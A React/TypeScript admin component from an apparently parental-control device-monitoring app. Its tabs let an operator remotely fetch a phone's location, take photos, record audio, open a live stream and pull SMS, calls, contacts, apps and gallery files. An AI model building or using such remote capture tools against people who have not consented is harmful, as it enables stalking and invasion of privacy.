// components/admin/devices/DeviceTabViews.tsx
"use client";

import React from "react";
import { MonitoredDevice, DeviceLocation, DeviceContact, DeviceCall, DeviceMessage, DeviceFileItem } from "@/lib/device-types";
import { DeviceMapTracker } from "@/components/admin/devices/DeviceMapTracker";
import { DeviceCameraGallery } from "@/components/admin/devices/DeviceCameraGallery";
import { DeviceAudioGallery, AudioCapture } from "@/components/admin/devices/DeviceAudioGallery";
import { DeviceContactsTable } from "@/components/admin/devices/DeviceContactsTable";
import { DeviceCallLogsList } from "@/components/admin/devices/DeviceCallLogsList";
import { DeviceMessagesFeed } from "@/components/admin/devices/DeviceMessagesFeed";
import { DeviceAppsTab } from "@/components/admin/devices/DeviceAppsTab";
import { DeviceLiveStreamPanel } from "@/components/admin/devices/DeviceLiveStreamPanel";
import { DeviceGalleryTab } from "@/components/admin/devices/DeviceGalleryTab";
import { ToggleLeft, ToggleRight, RefreshCw } from "lucide-react";

interface Props {
  activeTab: string;
  device: MonitoredDevice;
  locations: DeviceLocation[];
  contacts: DeviceContact[];
  calls: DeviceCall[];
  messages: DeviceMessage[];
  captures: any[];
  audioClips: AudioCapture[];
  files: DeviceFileItem[];
  filesLoading?: boolean;
  tabLoading?: boolean;
  isLiveMovement?: boolean;
  isTabEnabled?: boolean;
  onToggleTab?: () => void;
  onToggleLiveMovement?: (active: boolean) => void;
  locationMode?: "realtime" | "fetch";
  onToggleLocationMode?: () => void;
  onSendCommand: (cmd: string, payload?: any, label?: string) => void;
  onDeleteCommand: (id: string) => void;
  onBulkDeleteCommands?: (type: "take_photo" | "record_audio") => void;
  onDeleteContact?: (id: string) => void;
  onDeleteCall?: (id: string) => void;
  onDeleteMessage?: (id: string) => void;
  onDeleteApp?: (id: string) => void;
  onDeleteFile?: (id: string) => void;
  onBulkDeleteContacts?: () => void;
  onBulkDeleteCalls?: () => void;
  onBulkDeleteMessages?: () => void;
  onBulkDeleteApps?: () => void;
  onBulkDeleteFiles?: () => void;
}

const TOGGLEABLE_TABS = ["gallery", "contacts", "calls", "messages", "apps", "camera", "audio"];

export const DeviceTabViews: React.FC<Props> = ({
  activeTab, device, locations, contacts, calls, messages, captures, audioClips,
  files, filesLoading, tabLoading, isLiveMovement, isTabEnabled = true, onToggleTab,
  onToggleLiveMovement, locationMode = "realtime", onToggleLocationMode, onSendCommand, onDeleteCommand, onBulkDeleteCommands,
  onDeleteContact, onDeleteCall, onDeleteMessage, onDeleteApp, onDeleteFile,
  onBulkDeleteContacts, onBulkDeleteCalls, onBulkDeleteMessages, onBulkDeleteApps, onBulkDeleteFiles,
}) => {
  const showToggle = TOGGLEABLE_TABS.includes(activeTab);

  return (
    <div className="p-5 rounded-3xl bg-white dark:bg-[#0B0B0E] border border-slate-200 dark:border-white/10 shadow-xl">
      {/* Enable/Disable Toggle + Loading Indicator */}
      {(showToggle || tabLoading) && (
        <div className="flex items-center justify-between mb-4 pb-3 border-b border-white/5">
          {showToggle && onToggleTab && (
            <button onClick={onToggleTab} className={`flex items-center gap-2 py-1.5 px-3 rounded-xl text-xs font-bold transition-all border ${isTabEnabled ? "bg-emerald-500/15 border-emerald-500/30 text-emerald-400" : "bg-white/5 border-white/10 text-white/40"}`}>
              {isTabEnabled ? <ToggleRight className="w-4 h-4" /> : <ToggleLeft className="w-4 h-4" />}
              {isTabEnabled ? "Auto-Fetch Enabled" : "Auto-Fetch Disabled"}
            </button>
          )}
          {tabLoading && (
            <div className="flex items-center gap-1.5 text-[10px] text-[#FFFC00] font-mono">
              <RefreshCw className="w-3 h-3 animate-spin" /> Loading...
            </div>
          )}
        </div>
      )}

      {/* Disabled Tab Overlay */}
      {showToggle && !isTabEnabled ? (
        <div className="p-12 rounded-2xl bg-white/[0.02] border border-white/10 text-center space-y-3">
          <div className="w-14 h-14 rounded-2xl bg-white/5 border border-white/10 flex items-center justify-center mx-auto">
            <ToggleLeft className="w-7 h-7 text-white/30" />
          </div>
          <h4 className="text-sm font-bold text-white/50">Auto-Fetch is Disabled</h4>
          <p className="text-xs text-white/30 max-w-sm mx-auto">
            This tab will not fetch new data from the device. Click &quot;Auto-Fetch Disabled&quot; above to enable.
          </p>
        </div>
      ) : (
        <>
          {activeTab === "map" && (
            <div className="space-y-2">
              {/* Compact location mode controls */}
              <div className="flex items-center gap-2 flex-wrap">
                {/* Mode pill toggle */}
                <div className="flex items-center gap-0.5 p-0.5 rounded-xl bg-white/5 border border-white/10">
                  <button
                    onClick={() => locationMode === "fetch" && onToggleLocationMode?.()}
                    className={`py-1 px-2.5 rounded-lg text-[10px] font-bold transition-all ${
                      locationMode === "realtime" ? "bg-emerald-500/25 text-emerald-300 border border-emerald-500/30" : "text-white/40 hover:text-white/70"
                    }`}
                  >
                    ⚡ Realtime
                  </button>
                  <button
                    onClick={() => locationMode === "realtime" && onToggleLocationMode?.()}
                    className={`py-1 px-2.5 rounded-lg text-[10px] font-bold transition-all ${
                      locationMode === "fetch" ? "bg-[#FFFC00]/20 text-[#FFFC00] border border-[#FFFC00]/30" : "text-white/40 hover:text-white/70"
                    }`}
                  >
                    📍 Fetch Only
                  </button>
                </div>
                {/* Fetch Fresh button */}
                <button
                  onClick={() => onSendCommand("fetch_location", {}, "Location fetch request")}
                  className="py-1 px-2.5 rounded-xl bg-white/5 hover:bg-white/10 text-white font-bold text-[10px] border border-white/10 transition-all flex items-center gap-1 active:scale-95"
                >
                  <RefreshCw className="w-3 h-3 text-[#FFFC00]" />
                  Fetch Fresh
                </button>
                {locationMode === "realtime" && (
                  <span className="text-[9px] text-emerald-400/70 font-mono">● auto-updating</span>
                )}
              </div>
              <DeviceMapTracker locations={locations} childName={device.child_name} isLiveMovement={isLiveMovement} onToggleLiveMovement={onToggleLiveMovement} />
            </div>
          )}
          {activeTab === "camera" && (
            <DeviceCameraGallery captures={captures} onTriggerSnap={(cam) => onSendCommand("take_photo", { camera: cam }, `${cam} snap`)} onDeleteSnap={onDeleteCommand} onBulkDeleteSnaps={() => onBulkDeleteCommands?.("take_photo")} />
          )}
          {activeTab === "audio" && (
            <DeviceAudioGallery audioClips={audioClips} onTriggerAudio={(dur) => onSendCommand("record_audio", { duration: dur }, `${dur}s audio recording`)} onDeleteAudio={onDeleteCommand} onBulkDeleteAudio={() => onBulkDeleteCommands?.("record_audio")} />
          )}
          {activeTab === "apps" && (
            <DeviceAppsTab
              deviceId={device.id}
              onDeleteApp={onDeleteApp}
              onSync={() => onSendCommand("sync_apps", {}, "Apps sync")}
              onBulkDelete={onBulkDeleteApps}
            />
          )}
          {activeTab === "contacts" && (
            <DeviceContactsTable
              contacts={contacts}
              onDeleteContact={onDeleteContact}
              onSync={() => onSendCommand("sync_contacts", {}, "Contacts sync")}
              onBulkDelete={onBulkDeleteContacts}
            />
          )}
          {activeTab === "calls" && (
            <DeviceCallLogsList
              calls={calls}
              onDeleteCall={onDeleteCall}
              onSync={() => onSendCommand("sync_calls", {}, "Calls sync")}
              onBulkDelete={onBulkDeleteCalls}
            />
          )}
          {activeTab === "messages" && (
            <DeviceMessagesFeed
              messages={messages}
              onDeleteMessage={onDeleteMessage}
              onSync={() => onSendCommand("sync_messages", {}, "SMS sync")}
              onBulkDelete={onBulkDeleteMessages}
            />
          )}
          {activeTab === "stream" && (
            <DeviceLiveStreamPanel deviceId={device.id} childName={device.child_name} isOnline={device.is_online} onSendCommand={onSendCommand} />
          )}
          {activeTab === "gallery" && (
            <DeviceGalleryTab
              files={files}
              loading={filesLoading}
              onSyncGallery={() => onSendCommand("sync_gallery", {}, "Sync Gallery")}
              onSendCommand={onSendCommand}
              onDeleteFile={onDeleteFile}
              onBulkDeleteFiles={onBulkDeleteFiles}
            />
          )}
        </>
      )}
    </div>
  );
};
